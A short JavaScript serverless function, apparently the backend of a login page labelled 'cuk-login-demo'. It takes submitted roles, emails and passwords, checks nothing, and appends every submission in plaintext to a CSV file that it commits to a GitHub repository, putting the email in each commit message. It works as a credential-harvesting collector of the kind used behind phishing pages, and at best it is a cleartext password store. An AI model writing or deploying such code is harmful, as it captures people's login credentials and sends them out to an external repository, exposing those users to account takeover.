exports.handler = async function (event) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  const { role, email, password } = JSON.parse(event.body || '{}');

  const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
  const GITHUB_OWNER = process.env.GITHUB_OWNER;
  const GITHUB_REPO = process.env.GITHUB_REPO;
  const FILE_PATH = 'cuk/submissions/logins.csv';
  const BRANCH = process.env.GITHUB_BRANCH || 'main';

  if (!GITHUB_TOKEN || !GITHUB_OWNER || !GITHUB_REPO) {
    return { statusCode: 500, body: 'Server is missing GitHub configuration.' };
  }

  const apiUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`;
  const headers = {
    Authorization: `Bearer ${GITHUB_TOKEN}`,
    'User-Agent': 'cuk-login-demo',
    Accept: 'application/vnd.github+json'
  };

  try {
    let existingContent = 'timestamp,role,email,password\n';
    let sha = undefined;

    const getRes = await fetch(apiUrl + `?ref=${BRANCH}`, { headers });
    if (getRes.status === 200) {
      const fileData = await getRes.json();
      sha = fileData.sha;
      existingContent = Buffer.from(fileData.content, 'base64').toString('utf-8');
    }

    const timestamp = new Date().toISOString();
    const safeEmail = (email || '').replace(/,/g, ' ');
    const safePassword = (password || '').replace(/,/g, ' ');
    const newRow = `${timestamp},${role},${safeEmail},${safePassword}\n`;
    const updatedContent = existingContent + newRow;

    const putRes = await fetch(apiUrl, {
      method: 'PUT',
      headers,
      body: JSON.stringify({
        message: `Log submission: ${role} - ${safeEmail}`,
        content: Buffer.from(updatedContent).toString('base64'),
        branch: BRANCH,
        sha
      })
    });

    if (!putRes.ok) {
      const errText = await putRes.text();
      return { statusCode: 500, body: `GitHub commit failed: ${errText}` };
    }

    return { statusCode: 200, body: JSON.stringify({ saved: true }) };
  } catch (err) {
    return { statusCode: 500, body: `Error: ${err.message}` };
  }
};
